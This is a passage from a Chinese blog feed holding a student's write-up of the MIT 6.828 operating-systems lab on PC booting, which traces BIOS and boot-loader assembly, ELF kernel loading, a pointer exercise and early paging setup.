libFuzzer]</p><p>可以看出，在面对不同的模糊器选择策略时（但组合固定）时，autofz所提供的自动选择最佳性能模糊测试器的方法有显著的效果</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSlab1</title>
    <link href="/2023/11/29/OSlab1/"/>
    <url>/2023/11/29/OSlab1/</url>
    
    <content type="html"><![CDATA[<h2 id="OS-lab1-Booting-a-PC"><a href="#OS-lab1-Booting-a-PC" class="headerlink" title="OS  - lab1 Booting a PC"></a>OS  - lab1 Booting a PC</h2><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a><strong>实验目的：</strong></h3><ul><li>熟悉QEMU，了解PC开机程序</li><li>探究6.828的内核加载过程，了解开机后，内核是如何加载到内存并运行的</li><li>探究6.828内核的基本结构</li></ul><h3 id="第一部分：PC-Bootstrap"><a href="#第一部分：PC-Bootstrap" class="headerlink" title="第一部分：PC Bootstrap"></a>第一部分：PC Bootstrap</h3><p><img src="/2023/11/29/OSlab1/image-20231130154817983.png" alt="image-20231130154817983"></p><p>第一代PC处理器是16位字长的Intel 8088处理器，但其地址总线有20位，所以能够实现1MB的寻址（<strong>段寄存器中的值左移4位，形成20位段基址，然后和16位段内偏移相加</strong>），即0x00000000 - 0x000FFFFF，但也只有640KB是用户可用的，剩下的空间用作其他目的，如图所示。其中最重要的是BIOS ROM，BIOS负责进行一些基本的系统初始化任务，比如开启显卡，检查系统的内存大小等工作。在初始化完成之后，从合适的地方加载操作系统。</p><p>虽然Intel处理器突破了1MB内存空间，在80286和80386上已经实现了16MB，4GB的地址空间，但是PC的架构必须仍旧把原来的1MB的地址空间的结构保留下来，这样才能实现向后兼容性。所以现代计算机的地址 0x000A0000<del>0x00100000区间是一个空洞，不会被使用。因此这个空洞就把地址空间划分成了两个部分，第一部分就是从0x00000000</del>0x000A0000，叫做传统内存。剩下的不包括空洞的其他部分叫做扩展内存。而对于这种32位字长处理器通常把BIOS存放到整个存储空间的顶端处。</p><p><img src="/2023/11/29/OSlab1/image-20231130161251088.png" alt="image-20231130161251088"></p><h3 id="第二部分：The-Boot-Loader"><a href="#第二部分：The-Boot-Loader" class="headerlink" title="第二部分：The Boot Loader"></a>第二部分：The Boot Loader</h3><h4 id="练习2"><a href="#练习2" class="headerlink" title="练习2:"></a>练习2:</h4><p>使用gdb的<code>si</code>（单步调试）命令进入ROM BIOS并追踪几条指令，并猜测这些指令的作用。不需要指出指令具体的细节，只要理解BIOS一开始运行的核心思想而已。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[f000:fff0]    0xffff0: ljmp   $0xf000,$0xe05b # 跳到一个较早的位置<br>[f000:e05b]    0xfe05b: cmpl   $0x0,%cs:0x6ac8<br>[f000:e062]    0xfe062: jne    0xfd2e1         # 测试cs段的0x6ac8字是否为0        <br>[f000:e066]    0xfe066: xor    %dx,%dx         # 把dx寄存器清零<br>[f000:e068]    0xfe068: mov    %dx,%ss         <br>[f000:e06a]    0xfe06a: mov    $0x7000,%esp    <br>[f000:e070]    0xfe070: mov    $0xf34c2,%edx   <br>[f000:e076]    0xfe076: jmp    0xfd15c         <br>[f000:d15c]    0xfd15c: mov    %eax,%ecx       <br>[f000:d15f]    0xfd15f: cli                    # 关闭硬件中断<br>[f000:d160]    0xfd160: cld                    # 设置串传送指令方向<br>[f000:d161]    0xfd161: mov    $0x8f,%eax      <br>[f000:d167]    0xfd167: out    %al,$0x70       <br>[f000:d169]    0xfd169: in     $0x71,%al       # 关闭不可屏蔽中断，70，71端口用于控制CMOS，操作CMOS存储器中的内容需要两个端口，一个是0x70另一个就是0x71。其中0x70可以叫做索引寄存器，这个8位寄存器的最高位是不可屏蔽中断(NMI)使能位。如果你把这个位置1，则NMI不会被响应。低7位用于指定CMOS存储器中的存储单元地址<br>[f000:d16b]    0xfd16b: in     $0x92,%al       # 读取系统控制端口A<br>[f000:d16d]    0xfd16d: or     $0x2,%al        <br>[f000:d16f]    0xfd16f: out    %al,$0x92       # 通过快速A20以启动A20<br>[f000:d171]    0xfd171: lidtw  %cs:0x6ab8      # 将cs:0x6ab8加载进入IDT表<br>[f000:d177]    0xfd177: lgdtw  %cs:0x6a74      # 将cs:0x6a74加载进入GDT表<br>[f000:d17d]    0xfd17d: mov    %cr0,%eax   <br>[f000:d180]    0xfd180: or     $0x1,%eax       <br>[f000:d184]    0xfd184: mov    %eax,%cr0       # 将cr0寄存器的保护模式位打开<br>[f000:d187]    0xfd187: ljmpl  $0x8,$0xfd18f   # 通过ljmp指令进入保护模式<br>=&gt; 0xfd18f:     mov    $0x10,%eax              # 设置段寄存器<br>=&gt; 0xfd194:     mov    %eax,%ds<br>=&gt; 0xfd196:     mov    %eax,%es  <br>=&gt; 0xfd198:     mov    %eax,%ss<br>=&gt; 0xfd19a:     mov    %eax,%fs<br>=&gt; 0xfd19c:     mov    %eax,%gs<br>=&gt; 0xfd19e:     mov    %ecx,%eax  <br>=&gt; 0xfd1a0:     jmp    *%edx                   # 跳转<br></code></pre></td></tr></table></figure><p>总的来说，BIOS的操作就是在控制，初始化，检测各种底层的设备，比如时钟，GDTR寄存器。以及设置中断向量表。</p><h4 id="练习3"><a href="#练习3" class="headerlink" title="练习3:"></a>练习3:</h4><p>设置一个断点在地址0x7c00处，这是boot sector被加载的位置。然后让程序继续运行直到这个断点。跟踪&#x2F;boot&#x2F;boot.S文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件obj&#x2F;boot&#x2F;boot.asm。你也可以使用GDB的x&#x2F;i指令来获取去任意一个机器指令的反汇编指令，把源文件boot.S文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p><p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出和readsect()c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p><p><img src="/2023/11/29/OSlab1/image-20231202231040821.png" alt="image-20231202231040821"></p><p><img src="/2023/11/29/OSlab1/image-20231203100345159.png" alt="image-20231203100345159"></p><p>当BIOS运行完毕之后，cpu的控制权就会转移到boot.S上，所以分析boot.S，通过介绍可以看出，boot.S的总体作用是将实模式切换为保护模式</p><h5 id="Boot-S"><a href="#Boot-S" class="headerlink" title="Boot.S"></a>Boot.S</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl start<br>start:<br>  .code16                     # Assemble for 16-bit mode<br>  cli                         # Disable interrupts<br>  cld                         # String operations increment<br><br>  # Set up the important data segment registers (DS, ES, SS).<br>  xorw    %ax,%ax             # Segment number zero<br>  movw    %ax,%ds             # -&gt; Data Segment<br>  movw    %ax,%es             # -&gt; Extra Segment<br>  movw    %ax,%ss             # -&gt; Stack Segment<br></code></pre></td></tr></table></figure><p>cli用于关闭所有中断，cld用于指定串处理操作的指针移动方向，接下来是吧ds，es，ss全部清零，为后边进入保护模式做准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  # Enable A20:<br>  #   For backwards compatibility with the earliest PCs, physical<br>  #   address line 20 is tied low, so that addresses higher than<br>  #   1MB wrap around to zero by default.  This code undoes this.<br>seta20.1:<br>  inb     $0x64,%al               # Wait for not busy<br>  testb   $0x2,%al<br>  jnz     seta20.1<br><br>  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64<br>  outb    %al,$0x64<br><br>seta20.2:<br>  inb     $0x64,%al               # Wait for not busy<br>  testb   $0x2,%al<br>  jnz     seta20.2<br><br>  movb    $0xdf,%al               # 0xdf -&gt; port 0x60<br>  outb    %al,$0x60<br><br></code></pre></td></tr></table></figure><p>前三条指令读取了键盘控制器的0x64端口，并通过与2相与，来检测0x64的bit 1是否为1，也就是此时，输入缓冲区是否满了。只有当缓冲区不满时，才会执行后续代码</p><p><img src="/2023/11/29/OSlab1/image-20231203102700304.png" alt="image-20231203102700304"></p><p>后续将d1写入到0x64端口，d1代表下一次写入0x60端口的数据将被写入给804x控制器的输出端口。</p><p><img src="/2023/11/29/OSlab1/image-20231203104130794.png" alt="image-20231203104130794"></p><p>Seta20.2同理，表示将df写进0x60端口，df用于开启A20地址总线</p><p><img src="/2023/11/29/OSlab1/image-20231203104443964.png" alt="image-20231203104443964"></p><p><strong>什么是A20地址总线？：</strong></p><p>在早期的PC上处理器仅支持20位的地址空间，任何超过20位的地址都会被卷回。<br>例如：0xFFFF+0xFFFF &#x3D; 0x1FFFE -&gt; 0xFFFE</p><p>默认情况下，A20是置0的，进入保护模式前需要先打开A20以获得完全的寻址能力。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> # Switch from real to protected mode, using a bootstrap GDT<br> # and segment translation that makes virtual addresses <br> # identical to their physical addresses, so that the <br> # effective memory map does not change during the switch.<br> lgdt    gdtdesc<br> movl    %cr0, %eax<br> orl     $CR0_PE_ON, %eax<br> movl    %eax, %cr0<br> <br> ljmp    $PROT_MODE_CSEG, $protcseg<br> <br> <br> <br>.set PROT_MODE_CSEG, 0x8         # kernel code segment selector（这句在代码最开始）<br><br>gdtdesc:<br>.word   0x17                           # sizeof(gdt) - 1<br>   .long   gdt                            # address gdt<br></code></pre></td></tr></table></figure><p> lgdt gdtdesc，是把gdtdesc这个标识符（标识一个内存地址，共6个字节）送入全局映射描述符表寄存器GDTR中，后续将CR0的值置1，代表保护模式启动，最后的跳转表示将当前运行模式切换成32位地址模式</p><p><strong>什么是全局描述符表？</strong></p><p>记录的是内存各个段的信息，包括了段基址，段界限，段属性等信息。程序首先将对应的段选择子（可以理解为数组的索引）加载进入段寄存器中。然后在执行程序时，根据指令的内容确定应该使用的段寄存器，根据段寄存器中的段选择子确定应该使用的段描述符。再结合段描述符中包含的信息加上指令自身的地址构造出实际的物理地址。最终将该地址发送到地址总线上，到物理内存中寻址，并取回相应的数据。</p><p><img src="/2023/11/29/OSlab1/image-20231203110758011.png" alt="image-20231203110758011"></p><p>接下来是重新加载所有寄存器的值，这是按照规定来的，只有这样才能使刚刚加载完的GDTR值生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  .code32                     # Assemble for 32-bit mode<br>protcseg:<br>  # Set up the protected-mode data segment registers<br>  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector<br>  movw    %ax, %ds                # -&gt; DS: Data Segment<br>  movw    %ax, %es                # -&gt; ES: Extra Segment<br>  movw    %ax, %fs                # -&gt; FS<br>  movw    %ax, %gs                # -&gt; GS<br>  movw    %ax, %ss                # -&gt; SS: Stack Segment<br></code></pre></td></tr></table></figure><p>接下来的指令就是设置esp寄存器的值，并正式跳转到main.c文件的main函数部分执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Set up the stack pointer and call into C.<br>movl    $start, %esp<br>call bootmain<br></code></pre></td></tr></table></figure><h5 id="Main-c"><a href="#Main-c" class="headerlink" title="Main.c"></a>Main.c</h5><p>首先直接看Main.c的介绍</p><p><img src="/2023/11/29/OSlab1/image-20231203134914979.png" alt="image-20231203134914979"></p><p>这里可以看到main.c的任务是从硬盘引导一个ELF格式的内核镜像</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// read 1st page off disk</span><br>readseg((<span class="hljs-type">uint32_t</span>) ELFHDR, SECTSIZE*<span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>这里调用了一个函数readseg，这个函数的功能如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">readseg</span><span class="hljs-params">(uchar *pa, uint count, uint offset)</span>;<br></code></pre></td></tr></table></figure><p>把距离内核起始地址offset个偏移量存储单元作为起始，将它和它之后的count字节的数据读出送入以pa为起始地址的内存物理地址处。</p><p>所以main函数中，这条指令的意思就是把内核的前4MB的内容读取到ELFHDR中</p><p>接下来验证其是否为一个ELF文件</p><p><strong>什么是ELF？</strong></p><p>elf是一种文件格式，主要被用来把程序存放到磁盘上。是在程序被编译和链接后被创建出来的。一个elf文件包括多个段。对于一个可执行程序，通常包含存放代码的文本段(text section)，存放全局变量的data段，存放字符串常量的rodata段。elf文件的头部就是用来描述这个elf文件如何在存储器中存储。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// is this a valid ELF?</span><br><span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)<br>   <span class="hljs-keyword">goto</span> bad;<br></code></pre></td></tr></table></figure><p>elf头部信息的magic字段是整个头部信息的开端。并且如果这个文件是格式是ELF格式的话，文件的elf-&gt;magic应该是&#x3D;ELF_MAGIC的，所以这条语句就是判断这个输入文件是否是合法的elf可执行文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ph = (<span class="hljs-keyword">struct</span> Proghdr *) ((<span class="hljs-type">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff);<br></code></pre></td></tr></table></figure><p>头部中包含Program Header Table。这个表格存放着程序中所有段的信息。通过这个表我们才能找到要执行的代码段，数据段等等。所以我们要先获得这个表。</p><p>这条指令就可以完成这一点，首先elf是表头起址，而phoff字段代表Program Header Table距离表头的偏移量。所以ph可以被指定为Program Header Table表头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">eph = ph + ELFHDR-&gt;e_phnum;<br></code></pre></td></tr></table></figure><p>e_phnum存放的时候Program Header Table中表项的个数，所以这里是将eph指向表的末尾</p><p><img src="/2023/11/29/OSlab1/image-20231203142338121.png" alt="image-20231203142338121"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)<br>  <span class="hljs-comment">// p_pa is the load address of this segment (as well</span><br>    <span class="hljs-comment">// as the physical address)</span><br>readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);<br></code></pre></td></tr></table></figure><p>ph-&gt;pa指的是这个段在内存中的物理地址。ph-&gt;offset字段指的是这一段的开头相对于这个elf文件的开头的偏移量。ph-&gt;filesz字段指的是这个段在elf文件中的大小。ph-&gt;memsz则指的是这个段被实际装入内存后的大小。这个for循环就是在加载所有的段到内存中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>)) (ELFHDR-&gt;e_entry))();<br></code></pre></td></tr></table></figure><p>e_entry字段指向的是这个文件的执行入口地址。所以这里相当于开始运行这个文件。也就是内核文件。 自此就把控制权从boot loader转交给了操作系统的内核。</p><h4 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h4><p><strong>阅读5.1到5.5节。然后下载pointers.c的代码，并且编译运行它，确保你理解在屏幕上打印出来的所有的值是怎么来的。尤其要重点理解第1行，第6行的指针地址是如何得到的，以及在第2行到第4行的值是如何得到的，还有为什么在第5行打印出来的值看起来像程序崩溃了。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">4</span>];           <span class="hljs-comment">//int型数组</span><br>    <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<span class="hljs-comment">//int类型指针</span><br>    <span class="hljs-type">int</span> *c;             <span class="hljs-comment">//int类型指针</span><br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);<br>  <span class="hljs-comment">//a输出a数组首地址，b输出操作系统分配的内存空间的起始地址，c输出指针的值，此时是未一个未定义的值</span><br><br>    c = a;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>a[i] = <span class="hljs-number">100</span> + i; <span class="hljs-comment">//运行完，a中为100，101，102，103</span><br>    c[<span class="hljs-number">0</span>] = <span class="hljs-number">200</span>;       <span class="hljs-comment">//改a[0]为200</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c[<span class="hljs-number">1</span>] = <span class="hljs-number">300</span>;<br>    *(c + <span class="hljs-number">2</span>) = <span class="hljs-number">301</span>;<br>    <span class="hljs-number">3</span>[c] = <span class="hljs-number">302</span>;      <span class="hljs-comment">//访问数组的三种不同方法，修改了a数组的值</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c = c + <span class="hljs-number">1</span>;      <span class="hljs-comment">//c此时指向a[1]</span><br>    *c = <span class="hljs-number">400</span>;       <span class="hljs-comment">//修改a[1]为400</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c = (<span class="hljs-type">int</span> *) ((<span class="hljs-type">char</span> *) c + <span class="hljs-number">1</span>);<br>    *c = <span class="hljs-number">500</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    b = (<span class="hljs-type">int</span> *) a + <span class="hljs-number">1</span>;<br>    c = (<span class="hljs-type">int</span> *) ((<span class="hljs-type">char</span> *) a + <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;6: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> ac, <span class="hljs-type">char</span> **av)</span><br>&#123;<br>    f();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231203150710971.png" alt="image-20231203150710971"></p><p>第五条，将c强制类型转换成char，此时，c的值为0x7ffd7b5c3474，加1后，为0x7ffd7b5c3475，再转换成int，这样会同时影响a[1], a[2]，此时c操作的区域为75-79</p><p><img src="/2023/11/29/OSlab1/image-20231203153045625.png" alt="image-20231203153045625"></p><p>所以a[1]变成128144，a[2]变成256</p><p>第六条，b取a的地址+1，但此时b是int类型指针，所以值实际+4</p><p>c将a地址转换成char类型，再+1，值也+1</p><h4 id="练习5"><a href="#练习5" class="headerlink" title="练习5:"></a>练习5:</h4><p><strong>再次追踪引导加载程序的前几条指令，找出如果引导加载程序的链接地址错误，将会“中断”或执行错误的第一条指令。然后在<code>boot/Makefrag</code>中将链接地址更改为错误的值，运行<code>make clean</code>，使用<code>make</code>重新编译实验，再次追踪引导加载程序，查看会发生什么。不要忘记随后将链接地址更改回正确值，并再次运行<code>make clean</code>！</strong></p><p><strong>链接地址</strong></p><p>链接地址可以理解为通过编译器链接器处理形成的可执行程序中指令的地址，即逻辑地址</p><p><strong>加载地址</strong></p><p>可执行文件真正被装入内存后运行的地址，即物理地址。</p><p>在Lab中作者说，BIOS默认把boot loader加载到0x7C00内存地址处，所以就要求boot loader的链接地址也要在0x7C00处。boot loader地址的设定是在boot&#x2F;Makefrag中完成的，所以修改这个值应该就是题目所要求的</p><p>根据题目要求，找到Makefrag中的链接位置，这里将0x7c00修改成0x7e00，重新执行make</p><p><img src="/2023/11/29/OSlab1/image-20231203155358101.png" alt="image-20231203155358101"></p><p>下图这条指令是把指令后面的值所指定内存地址处后6个字节的值输入全局描述符表寄存器GDTR，但是当前这条指令读取的内存地址是0x7e64，这里存入的全部是0，就导致了GDT表读取的值不正确，如果要进入保护模式，就必须要先启动分段机制，如果全局描述符表读取不正确，段的信息也不正确，自然无法成功启动</p><p><img src="/2023/11/29/OSlab1/image-20231203162346709.png" alt="image-20231203162346709"></p><p>继续执行，运行到这里之后就出错了，因为实际要跳转去的位置是0x7c32</p><p><img src="/2023/11/29/OSlab1/image-20231203163201635.png" alt="image-20231203163201635"></p><h4 id="练习6"><a href="#练习6" class="headerlink" title="练习6"></a>练习6</h4><p><strong>在BIOS进入Boot loader时检查在0x00100000处的8个字，然后在引导加载程序进入内核时再次检查。 他们为什么不同？</strong> </p><p>答：在BIOS进入Boot loader时，0x100000内存后的8个字都为零，因为此时内核程序还没有加载进入内存。 内核的加载在<code>bootmain</code>函数中完成。</p><p><img src="/2023/11/29/OSlab1/image-20231207173300436.png" alt="image-20231207173300436"></p><p><img src="/2023/11/29/OSlab1/image-20231207173652370.png" alt="image-20231207173652370"></p><h3 id="第三部分：Loading-the-Kernel"><a href="#第三部分：Loading-the-Kernel" class="headerlink" title="第三部分：Loading the Kernel"></a>第三部分：Loading the Kernel</h3><h4 id="练习7"><a href="#练习7" class="headerlink" title="练习7"></a>练习7</h4><p>使用QEMU和GDB来跟踪进入JOS内核并在movl %eax, %cr0处停下来。检查地址0x00100000和0xf0100000的内存。现在，使用GDB命令stepi单步执行该指令。再次检查地址0x00100000和0xf0100000的内存。确保你理解刚刚发生的事情。</p><p>在新映射建立后，如果映射没有生效，会导致无法正常工作的第一条指令是什么？将kern&#x2F;entry.S中的movl %eax, %cr0注释掉，进行跟踪，看看你是否正确。</p><p>操作系统内核通常被链接到非常高的虚拟地址（例如0xf0100000）下运行，以便留下处理器虚拟地址空间的低地址部分供用户程序使用。</p><p>许多机器在地址范围无法达到<code>0xf0100000</code>，因此我们无法指望能够在那里存储内核。相反，我们将使用处理器的内存管理硬件将虚拟地址<code>0xf0100000</code>（内核代码期望运行的链接地址）映射到物理地址<code>0x00100000</code>（引导加载程序将内核加载到物理内存中）。</p><p>现在，我们只需映射前4MB的物理内存，这足以让我们启动并运行。 我们使用<code>kern/entrypgdir.c</code>中手写的，静态初始化的页面目录和页表来完成此操作。</p><p>为了实现虚拟地址，需要通过CR0，这个寄存器的第31位是分页标志</p><p><img src="/2023/11/29/OSlab1/image-20231203203708983.png" alt="image-20231203203708983"></p><p>显然在执行完mov %eax，%cr0后，地址映射成功了</p><p><img src="/2023/11/29/OSlab1/image-20231203204834851.png" alt="image-20231203204834851"></p><p>猜测会出错的是mov $relocated, %eax，relocated这个的地址是段地址+偏移地址得到的，如果映射失败，那么段地址将还是在高地址，计算后，应该会导致越界错误，通过gdb验证：</p><p><img src="/2023/11/29/OSlab1/image-20231203205746371.png" alt="image-20231203205746371"></p><p>注释了之后，发现地址映射确实失败，继续运行，到mov $relocated, %eax时，qemu也打印出了错误终止运行。</p><h4 id="练习8"><a href="#练习8" class="headerlink" title="练习8"></a>练习8</h4><p><strong>我们省略了一小段代码 - 使用“%o”形式的模式打印八进制数所需的代码。找到并填写此代码片段。</strong></p><p>题目要求我们阅读三个源文件（\kern\printf.c , \kern\console.c , \lib\printfmt.c）的代码，并弄清楚他们的关系</p><ul><li><strong>\kern\printf.c</strong>中的cprintf，vcprintf子程序调用了<strong>\lib\printfmt.c</strong>中的<strong>vprintfmt</strong>子程序。</li><li><strong>\kern\printf.c</strong>中的putch子程序中调用了<strong>cputchar</strong>，这个程序是定义在<strong>\kern\console.c</strong>中的。</li><li><strong>\lib\printfmt.c</strong>中的一些功能也依赖于<strong>cputchar</strong>子程序</li></ul><p>所以得出结论，<strong>\kern\printf.c</strong>，<strong>\lib\printfmt.c</strong>两个文件的功能依赖于<strong>\kern\console.c</strong>的功能。所以我们就看一下<strong>\kern\console.c</strong>。</p><p><strong>\kern\console.c</strong>：</p><p>代码较长，关注较为重要的cputchar</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cputchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    cons_putc(c);<br>&#125;<br><br><span class="hljs-comment">// output a character to the console</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cons_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    serial_putc(c);<br>    lpt_putc(c);<br>    cga_putc(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么再看serial_putc(c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 